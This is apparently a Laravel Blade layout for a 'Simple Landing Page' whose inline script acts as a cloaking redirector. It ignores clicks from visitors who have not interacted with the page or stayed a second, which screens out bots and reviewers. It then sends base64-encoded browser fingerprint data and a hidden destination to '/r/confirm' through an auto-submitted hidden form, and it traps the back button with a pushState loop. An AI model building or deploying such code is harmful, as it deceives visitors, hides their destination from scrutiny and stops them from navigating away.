<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Simple Landing Page</title>
    <meta name="description" content="Simple Landing Page"/>
    <meta name="author" content="Lovable"/>
    <meta property="og:image" content="/og-image.png"/>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    animation: {
                        'bounce-slow': 'bounce 3s linear infinite',
                    }
                }
            }
        }
    </script>
    <script>
        localStorage.setItem("myCat", "Tom");
        const cat = localStorage.getItem("myCat");
        function submitForm(data, url) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = url;
            form.style.display = 'none';

            Object.entries(data).forEach(([key, value]) => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = value;
                form.appendChild(input);
            });

            // CSRF token для Laravel
            const token = document.createElement('input');
            token.type = 'hidden';
            token.name = '_token';
            token.value = document.querySelector('meta[name="csrf-token"]')?.content || '';
            form.appendChild(token);

            document.body.appendChild(form);
            form.submit();
        }
        const getCookie = (name) => {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        };
        let pageLoadTime = Date.now();
        let hasInteracted = false;

        document.addEventListener('mousemove', () => hasInteracted = true);
        document.addEventListener('touchstart', () => hasInteracted = true);
        document.addEventListener('scroll', () => hasInteracted = true);

        const getMetrics = () => {
            return {
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                platform: navigator.platform,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        };

        async function handleClick(event, element) {
            event.preventDefault();

            const timeOnPage = Date.now() - pageLoadTime;
            if (!hasInteracted || timeOnPage < 1000) {
                return false;
            }

            try {
                const encodedResource = element.dataset.resource;

                const data = {
                    'metrics': btoa(JSON.stringify(getMetrics())),
                    'url': encodedResource,
                }
                window.history.pushState(null, '', '/');
                window.onpopstate = function() {
                    window.history.pushState(null, '', '/');
                };
                submitForm(data, '/r/confirm');
                //window.location.href = finalUrl;
            } catch(e) {
                return false;
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            document.querySelectorAll('[data-resource]').forEach(element => {
                element.style.cursor = 'pointer';
                element.addEventListener('click', (e) => handleClick(e, element));
            });
        });
    </script>
</head>
<body>
@yield('content')
<style>
    @keyframes fadeIn {
        from {
            opacity: 0;
            transform: translateY(20px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }
</style>
</body>
</html>
